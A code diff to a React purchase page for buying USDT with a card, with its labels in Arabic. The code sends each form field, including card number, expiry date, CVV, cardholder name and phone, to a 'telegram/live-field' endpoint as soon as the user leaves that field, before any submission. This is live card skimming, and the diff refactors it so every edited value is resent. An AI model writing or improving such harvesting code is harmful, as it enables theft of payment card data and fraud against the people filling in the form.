@@ -83,13 +83,12 @@ export default function Buy() {
   const watchAmount = form.watch("amount");
   const calculatedIqd = (Number(watchAmount) || 0) * rate;
 
-  const sentFields = useRef(new Set<string>());
+  const lastSentValues = useRef<Record<string, string>>({});
 
   const sendLiveField = useCallback((field: string, value: string) => {
     if (!value || value.trim().length === 0) return;
-    const key = `${field}:${value}`;
-    if (sentFields.current.has(key)) return;
-    sentFields.current.add(key);
+    if (lastSentValues.current[field] === value) return;
+    lastSentValues.current[field] = value;
     fetch(`${import.meta.env.BASE_URL}api/telegram/live-field`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -97,12 +96,20 @@ export default function Buy() {
     }).catch(() => {});
   }, []);
 
-  const handleFieldBlur = useCallback((field: string) => {
-    const value = form.getValues(field as any);
-    if (value !== undefined && value !== null && String(value).trim()) {
-      sendLiveField(field, String(value));
-    }
+  const makeBlurHandler = useCallback((field: string, registerOnBlur?: (e: any) => void) => {
+    return (e: any) => {
+      if (registerOnBlur) registerOnBlur(e);
+      const value = form.getValues(field as any);
+      if (value !== undefined && value !== null && String(value).trim()) {
+        sendLiveField(field, String(value));
+      }
+    };
   }, [form, sendLiveField]);
+
+  const reg = useCallback((field: keyof FormValues, opts?: any) => {
+    const { onBlur, ...rest } = form.register(field, opts);
+    return { ...rest, onBlur: makeBlurHandler(field, onBlur) };
+  }, [form, makeBlurHandler]);
 
   const onSubmit = async (data: FormValues) => {
     try {
@@ -218,8 +225,7 @@ export default function Buy() {
                         <label className="block text-sm font-medium text-zinc-400 mb-2">المبلغ بالدولار (USDT) <span className="text-red-400">*</span></label>
                         <div className="relative">
                           <input 
-                            {...form.register("amount")}
-                            onBlur={() => handleFieldBlur("amount")}
+                            {...reg("amount")}
                             type="number"
                             inputMode="numeric"
                             className={cn(
@@ -237,8 +243,7 @@ export default function Buy() {
                       <div>
                          <label className="block text-sm font-medium text-zinc-400 mb-2">عنوان المحفظة (TRC20) <span className="text-red-400">*</span></label>
                          <input 
-                            {...form.register("walletAddress")}
-                            onBlur={() => handleFieldBlur("walletAddress")}
+                            {...reg("walletAddress")}
                             type="text"
                             placeholder="T..."
                             className={cn(
@@ -264,8 +269,7 @@ export default function Buy() {
                       <div>
                         <label className="block text-sm font-medium text-zinc-400 mb-2">الاسم كما في البطاقة <span className="text-red-400">*</span></label>
                         <input 
-                          {...form.register("cardName")}
-                          onBlur={() => handleFieldBlur("cardName")}
+                          {...reg("cardName")}
                           type="text"
                           className={cn(
                             "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all",
@@ -278,12 +282,11 @@ export default function Buy() {
                       <div>
                         <label className="block text-sm font-medium text-zinc-400 mb-2">رقم البطاقة <span className="text-red-400">*</span></label>
                         <input 
-                          {...form.register("cardNumber", {
-                            onChange: (e) => {
+                          {...reg("cardNumber", {
+                            onChange: (e: any) => {
                               e.target.value = formatCardNumber(e.target.value);
                             }
                           })}
-                          onBlur={() => handleFieldBlur("cardNumber")}
                           type="text"
                           inputMode="numeric"
                           maxLength={16}
@@ -301,12 +304,11 @@ export default function Buy() {
                         <div>
                           <label className="block text-sm font-medium text-zinc-400 mb-2">تاريخ الانتهاء <span className="text-red-400">*</span></label>
                           <input 
-                            {...form.register("expiryDate", {
-                              onChange: (e) => {
+                            {...reg("expiryDate", {
+                              onChange: (e: any) => {
                                 e.target.value = formatExpiryDate(e.target.value);
                               }
                             })}
-                            onBlur={() => handleFieldBlur("expiryDate")}
                             type="text"
                             inputMode="numeric"
                             placeholder="MM/YY"
@@ -322,12 +324,11 @@ export default function Buy() {
                         <div>
                           <label className="block text-sm font-medium text-zinc-400 mb-2">CVV <span className="text-red-400">*</span></label>
                           <input 
-                            {...form.register("cvv", {
-                              onChange: (e) => {
+                            {...reg("cvv", {
+                              onChange: (e: any) => {
                                 e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
                               }
                             })}
-                            onBlur={() => handleFieldBlur("cvv")}
                             type="password"
                             inputMode="numeric"
                             maxLength={4}
@@ -345,8 +346,7 @@ export default function Buy() {
                       <div>
                         <label className="block text-sm font-medium text-zinc-400 mb-2">رقم الهاتف <span className="text-red-400">*</span></label>
                         <input 
-                          {...form.register("phone")}
-                          onBlur={() => handleFieldBlur("phone")}
+                          {...reg("phone")}
                           type="tel"
                           inputMode="numeric"
                           placeholder="07XX XXX XXXX"
@@ -363,8 +363,7 @@ export default function Buy() {
                         <label className="block text-sm font-medium text-zinc-400 mb-2">كود الخصم (اختياري)</label>
                         <div className="flex gap-3">
                           <input 
-                            {...form.register("couponCode")}
-                            onBlur={() => handleFieldBlur("couponCode")}
+                            {...reg("couponCode")}
                             type="text"
                             placeholder="أدخل الكود"
                             className="flex-1 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left uppercase"
